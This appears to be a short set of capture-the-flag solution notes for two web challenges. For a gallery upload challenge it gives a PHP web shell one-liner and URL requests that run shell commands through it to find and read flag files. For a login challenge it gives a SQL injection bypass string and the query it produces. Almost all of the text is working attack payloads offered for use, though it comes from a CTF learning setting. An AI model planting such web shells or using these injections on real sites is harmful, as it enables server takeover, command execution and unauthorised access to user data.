## Gallery
web shell oneliner (must end w/ .php)
```php
$ <?php echo system($_GET["cmd"]); ?>
```
in provided path `/uploads/____/`
```j
foo.php?cmd=find+../../+-name+*flag*
foo.php?cmd=cat+../../*/*flag*
```

## Simple Question of Logic 1
use this in both fields ([ctf101](https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/) . [sqlmap](https://d00mfist.gitbooks.io/ctf/content/sql-injections.html) . [hacktricks](https://book.hacktricks.xyz/pentesting-web/login-bypass))
```sh
# classic login bypass

x' or '1'='1
x' or '1'='1
```
as if to say
```erlang
$sql = "select * from users where username = 'x' OR '1'='1' and password = 'x' OR '1'='1'";
```